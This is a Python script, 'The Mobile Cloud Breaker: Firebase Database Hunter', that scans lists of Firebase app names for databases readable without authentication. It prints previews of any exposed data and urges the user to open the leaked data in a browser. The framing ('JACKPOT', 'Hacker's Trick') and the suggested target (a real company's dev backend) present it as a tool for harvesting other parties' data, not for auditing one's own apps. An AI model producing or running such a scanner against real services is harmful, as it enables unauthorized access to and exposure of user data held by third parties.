import requests
import sys
import time

def scan_firebase(app_names):
    print(f"\n[*] Bhai, starting The Mobile Cloud Breaker: Firebase Database Hunter...")
    print(f"[*] Scanning {len(app_names)} potential app backends for insecure data leaks!\n")
    print("==================================================")

    found_leaks = 0

    for app in app_names:
        app = app.strip()
        if not app: continue
        
        # The Hacker's Trick: Appending /.json to the root Firebase URL
        target_url = f"https://{app}.firebaseio.com/.json"
        
        print(f"[*] Probing Firebase API: {target_url}")
        
        try:
            # We use a short timeout and only request headers/small data chunk if possible
            response = requests.get(target_url, timeout=5)
            status = response.status_code
            
            if status == 200:
                # 200 OK means the database is PUBLICLY READABLE!
                data_preview = str(response.text)[:80].replace('\n', '')
                
                # Sometimes it returns 'null' if the DB is empty but open.
                if data_preview != "null":
                    print(f"   [!!!] JACKPOT 🎯 CRITICAL FIREBASE LEAK FOUND!")
                    print(f"   [!!!] Target: {app}")
                    print(f"   [!!!] Data Preview: {data_preview}...")
                    print(f"   [!!!] Action: Open {target_url} in your browser immediately!\n")
                    found_leaks += 1
                else:
                    print(f"   [!] OPEN BUT EMPTY: {app} is readable, but currently has no data ('null').\n")
            
            elif status == 401 or status == 403:
                print(f"   [-] Secure: {app} requires authentication (HTTP {status}).\n")
            elif status == 404:
                print(f"   [-] Not Found: {app} database does not exist.\n")
            else:
                print(f"   [?] Unknown Response: HTTP {status} for {app}.\n")
                
            time.sleep(0.5) # Be polite to Google's servers

        except requests.exceptions.RequestException:
            print(f"   [!] Connection Error for {app}. Skipping...\n")

    print("==================================================")
    if found_leaks > 0:
        print(f"[+] Scan Complete! Found {found_leaks} completely open Mobile API Databases! 💀💸")
    else:
        print("[-] Scan Complete. All tested Firebase instances are secure.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Allow passing a single app name or reading from a file
    if len(sys.argv) < 2:
        print("Usage (Single App): python3 firebase_hunter.py <firebase_app_name>")
        print("Usage (Wordlist):   python3 firebase_hunter.py -l <app_list.txt>")
        print("Example: python3 firebase_hunter.py uber-dev")
        sys.exit(1)

    if sys.argv[1] == "-l" and len(sys.argv) == 3:
        try:
            with open(sys.argv[2], 'r') as f:
                targets = f.readlines()
            scan_firebase(targets)
        except FileNotFoundError:
            print(f"[-] Error: Could not find file {sys.argv[2]}")
    else:
        # Just a single target passed directly
        scan_firebase([sys.argv[1]])
